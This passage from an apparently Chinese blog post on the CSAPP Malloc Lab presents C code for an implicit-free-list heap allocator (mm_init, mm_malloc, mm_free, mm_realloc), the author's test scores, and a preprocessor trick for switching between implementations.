punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>osize<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>osize <span class="token operator">>=</span> asize<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                         <span class="token comment">// 合并后足够分配</span>            <span class="token function">place</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> asize<span class="token punctuation">)</span><span class="token punctuation">;</span>            bp <span class="token operator">=</span> ptr<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>bp <span class="token operator">=</span> <span class="token function">find_fit</span><span class="token punctuation">(</span>asize<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 合并后仍然不够，查找新块</span>            <span class="token function">place</span><span class="token punctuation">(</span>bp<span class="token punctuation">,</span> asize<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">memcpy</span><span class="token punctuation">(</span>bp<span class="token punctuation">,</span> ptr<span class="token punctuation">,</span> <span class="token function">MIN</span><span class="token punctuation">(</span>osize<span class="token punctuation">,</span> asize<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">mm_free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                                      <span class="token comment">// 未匹配任何块，申请更多内存</span>            extendsize <span class="token operator">=</span> <span class="token function">MAX</span><span class="token punctuation">(</span>asize<span class="token punctuation">,</span> CHUNKSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>bp <span class="token operator">=</span> <span class="token function">extend_heap</span><span class="token punctuation">(</span>extendsize <span class="token operator">/</span> WSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">place</span><span class="token punctuation">(</span>bp<span class="token punctuation">,</span> asize<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">memcpy</span><span class="token punctuation">(</span>bp<span class="token punctuation">,</span> ptr<span class="token punctuation">,</span> <span class="token function">MIN</span><span class="token punctuation">(</span>osize<span class="token punctuation">,</span> asize<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token function">mm_free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> bp<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h3><p>最终经过测试，隐式空闲链表的得分如下所示。其中内存利用率得分为 46 分（满分 60 分），意外的还不错。性能得分起伏较大，分数在 20~35 分（满分 40 分）不等，这部分感觉比较玄学。</p><p><img src="/2025/01/10/CSAPP-Malloc-Lab/implist-score.png" alt></p><h3 id="小技巧：如何切换不同的mm-c实现"><a href="#小技巧：如何切换不同的mm-c实现" class="headerlink" title="小技巧：如何切换不同的mm.c实现"></a>小技巧：如何切换不同的<code>mm.c</code>实现</h3><p>本 Lab 可能需要写多个不同版本的 <code>mm.c</code>，进行效率得分的比对，如何在不同的 <code>mm.c</code> 实现中切换值得一说。</p><p>起初我的设想是使用宏控制不同 <code>mm.c</code> 源文件的预处理，并将它们（例如 <code>mm-imp.c</code>、<code>mm-ex.c</code>）都写入 Makefile 中同时编译，但这样又得分别编写各自的编译行为，比较麻烦。</p><p>最后想到将 <code>mm-imp.c</code> 和 <code>mm-ex.c</code> 视作文本文件，不进行编译，而是供实际编译的 <code>mm.c</code> 借助预处理器选择性导入：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">/* mm.c */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression"><span class="token number">0</span></span></span>    <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"mm-imp.c"</span>  <span class="token comment">// 启用隐式空闲链表</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span>    <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"mm-ex.c"</span>   <span class="token comment">// 启用显式空闲链表</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span></code></pre><p>这样在每次在显式和隐式实现中切换时就只需要更改 <code>#if</code> 后的 0 和 1 了。</p><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">/* single word (4) or double word (8) alignment */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ALIGNMENT</span> <span class="token expression"><span class="token number">8</span></span></span><span class="token comment">/* rounds up to the nearest multiple of ALIGNMENT */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">ALIGN</span><span class="token expression"><span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>ALIGNMENT <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token number">0x7</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SIZE_T_SIZE</span> <span class="token expression"><span class="token punctuation">(</span><span class="token function">ALIGN</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token comment">/* Basic constants and macros */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">WSIZE</span> <span class="token expression"><span class="token number">4</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DSIZE</span> <span class="token expression"><span class="token number">8</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CHUNKSIZE</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">12</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">MAX</span><span class="token expression"><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token punctuation">(</span>y<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">MIN</span><span class="token expression"><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token punctuation">(</span>y<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token comment">/* Pack and write a word at address p */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">PACK</span><span class="token expression"><span class="token punctuation">(</span>size<span class="token punctuation">,</span> alloc<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>alloc<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token comment">/* Read and write a word at address p */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">GET</span><span class="token expression"><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">PUT</span><span class="token expression"><span class="token punctuation">(</span>p<span class="token punctuation">,</span> val<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token comment">/* Read the size and allocated fields from address p */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">GET_SIZE</span><span class="token expression"><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token function">GET</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token number">0x7</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">GET_ALLOC</span><span class="token expression"><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token function">GET</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x1</span><span class="token punctuation">)</span></span></span><span class="token comment">/* Given block ptr bp, compute address of its header and footer */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">HDRP</span><span class="token expression"><span class="token punctuation">(</span>bp<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span> <span class="token operator">-</span> WSIZE<span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">FTRP</span><span class="token expression"><span class="token punctuation">(</span>bp<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> DSIZE<span class="token punctuation">)</span></span></span><span class="token comment">/* Given block ptr bp, compute address of next and previous blocks */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">NEXT_BLKP</span><span class="token expression"><span class="token punctuation">(</span>bp<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span> <span class="token operator">-</span> WSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">PREV_BLKP</span><span class="token expression"><span class="token punctuation">(</span>bp<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span> <span class="token operator">-</span> DSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span>heap_listp<span class="token punctuation">;</span>  <span class="token comment">// 堆链表</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">extend_heap</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> words<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">coalesce</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">find_fit</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> asize<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">place</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>bp<span class="token punctuation">,</span> <span class="token class-name">size_t</span> asize<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">mm_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// 创建初始堆链表</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>heap_listp <span class="token operator">=</span> <span class="token function">mem_sbrk</span><span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> WSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span>heap_listp<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span>heap_listp <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">*</span> WSIZE<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>DSIZE<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// prologue header</span>    <span class="token function">PUT</span><span class="token punctuation">(</span>heap_listp <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> WSIZE<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>DSIZE<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// prologue footer</span>    <span class="token function">PUT</span><span class="token punctuation">(</span>heap_listp <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">3</span> <span class="token operator">*</span> WSIZE<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// epilogue header</span>    heap_listp <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> WSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 使用 CHUNKSIZE 字节大小的块扩展堆链表</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">extend_heap</span><span class="token punctuation">(</span>CHUNKSIZE <span class="token operator">/</span> WSIZE<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">mm_malloc</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">size_t</span> asize<span class="token punctuation">;</span>    <span class="token class-name">size_t</span> extendsize<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>bp<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 调整块大小以对齐</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">&lt;</span> DSIZE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        asize <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> DSIZE<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        asize <span class="token operator">=</span> DSIZE <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>size <span class="token operator">+</span> <span class="token punctuation">(</span>DSIZE<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>DSIZE <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> DSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 搜索堆链表进行匹配</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>bp <span class="token operator">=</span> <span class="token function">find_fit</span><span class="token punctuation">(</span>asize<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">place</span><span class="token punctuation">(</span>bp<span class="token punctuation">,</span> asize<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> bp<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 未匹配任何块，申请更多内存</span>    extendsize <span class="token operator">=</span> <span class="token function">MAX</span><span class="token punctuation">(</span>asize<span class="token punctuation">,</span> CHUNKSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>bp <span class="token operator">=</span> <span class="token function">extend_heap</span><span class="token punctuation">(</span>extendsize <span class="token operator">/</span> WSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">place</span><span class="token punctuation">(</span>bp<span class="token punctuation">,</span> asize<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> bp<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">mm_free</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">size_t</span> size <span class="token operator">=</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">coalesce</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">mm_realloc</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">size_t</span> osize<span class="token punctuation">,</span> asize<span class="token punctuation">;</span>    <span class="token class-name">size_t</span> extendsize<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>bp<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>ptr <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">mm_malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">mm_free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 调整块大小以对齐</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">&lt;</span> DSIZE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        asize <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> DSIZE<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        asize <span class="token operator">=</span> DSIZE <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>size <span class="token operator">+</span> <span class="token punctuation">(</span>DSIZE<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>DSIZE <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> DSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    osize <span class="token operator">=</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>osize <span class="token operator">==</span> asize<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 不变</span>        bp <span class="token operator">=</span> ptr<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>osize <span class="token operator">></span> asize<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 收缩，进行分割</span>        <span class="token function">place</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> asize<span class="token punctuation">)</span><span class="token punctuation">;</span>        bp <span class="token operator">=</span> ptr<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                     <span class="token comment">// 扩张，首先尝试合并相邻块，若相邻块已分配或合并后仍然不够，</span>                                 <span class="token comment">// 则尝试查找新块，若找不到，则进行堆空间的申请</span>        <span class="token comment">// 合并相邻块（简化版：只合并后续块）</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GET_ALLOC</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            osize <span class="token operator">+=</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>osize<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>osize<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>osize <span class="token operator">>=</span> asize<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                         <span class="token comment">// 合并后足够分配</span>            <span class="token function">place</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> asize<span class="token punctuation">)</span><span class="token punctuation">;</span>            bp <span class="token operator">=</span> ptr<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>bp <span class="token operator">=</span> <span class="token function">find_fit</span><span class="token punctuation">(</span>asize<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 合并后仍然不够，查找新块</span>            <span class="token function">place</span><span class="token punctuation">(</span>bp<span class="token punctuation">,</span> asize<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">memcpy</span><span class="token punctuation">(</span>bp<span class="token punctuation">,</span> ptr<span class="token punctuation">,</span> <span class="token function">MIN</span><span class="token punctuation">(</span>osize<span class="token punctuation">,</span> asize<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">mm_free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                                      <span class="token comment">// 未匹配任何块，申请更多内存</span>            extendsize <span class="token operator">=</span> <span class="token function">MAX</span><span class="token punctuation">(</span>asize<span class="token punctuation">,</span> CHUNKSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>bp <span class="token operator">=</span> <span class="token function">extend_heap</span><span class="token punctuation">(</span>extendsize <span class="token operator">/</span> WSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">place</span><span class="token punctuation">(</span>bp<span class="token punctuation">,</span> asize<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">memcpy</span><span class="token punctuation">(</span>bp<span class="token punctuation">,</span> ptr<span class="token punctuation">,</span> <span class="token function">MIN</span><span class="token punctuation">(</span>osize<span class="token punctuation">,</span> asize<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token function">mm_free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> bp<span class="token punctuation">;</span><span class="token 